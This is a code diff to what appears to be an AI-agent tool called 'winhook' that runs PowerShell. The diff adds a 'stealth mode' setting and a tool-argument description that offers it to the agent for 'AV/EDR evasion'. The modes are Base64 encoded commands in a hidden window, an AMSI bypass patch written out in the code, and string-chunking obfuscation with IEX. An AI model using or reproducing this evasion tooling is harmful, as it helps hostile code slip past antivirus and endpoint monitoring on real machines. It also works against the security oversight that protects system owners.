@@ -497,6 +497,11 @@ type Finding = {
 }
 type HookResult = { output: string; findings: Finding[] }
 
+// ── Stealth mode ──
+
+type StealthMode = "base64" | "amsi" | "obfuscate"
+let activeStealth: StealthMode | undefined
+
 // ── CLI helpers ──
 
 async function run(
@@ -522,22 +527,23 @@ function toBase64(script: string): string {
   return typeof btoa === "function" ? btoa(bin) : Buffer.from(utf16).toString("base64")
 }
 
-function ps(script: string, timeout: number, stealth?: "base64" | "amsi" | "obfuscate") {
-  if (!stealth) {
+function ps(script: string, timeout: number, stealth?: StealthMode) {
+  const mode = stealth || activeStealth
+  if (!mode) {
     return run(
       "powershell.exe",
       ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script],
       timeout,
     )
   }
-  if (stealth === "base64") {
+  if (mode === "base64") {
     return run(
       "powershell.exe",
       ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", toBase64(script)],
       timeout,
     )
   }
-  if (stealth === "amsi") {
+  if (mode === "amsi") {
     const patch = `$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');$f.SetValue($null,$true);`
     return run(
       "powershell.exe",
@@ -17366,7 +17372,7 @@ export const WinhookTool = Tool.define("winhook", {
           .map(([k, v]) => `${k} — ${v.description}`)
           .join("; "),
     ),
-    args: z.array(z.string()).describe("Arguments to pass to the program"),
+    args: z.array(z.string()).describe("Arguments to pass to the program. Use --stealth <mode> for AV/EDR evasion: base64 (EncodedCommand), amsi (AMSI patch + Base64), obfuscate (string chunking + IEX + Base64)"),
     timeout_seconds: z.number().optional().default(120).describe("Maximum execution time in seconds (default: 120)"),
   }),
   async execute(params) {
@@ -17378,9 +17384,12 @@ export const WinhookTool = Tool.define("winhook", {
       }
     }
 
+    activeStealth = argVal(params.args, "--stealth") as StealthMode | undefined
+
     const program = params.program as Program
     const handler = dispatch[program]
     const result = await handler(params.args, params.timeout_seconds)
+    activeStealth = undefined
 
     return {
       title: `winhook: ${program}`,
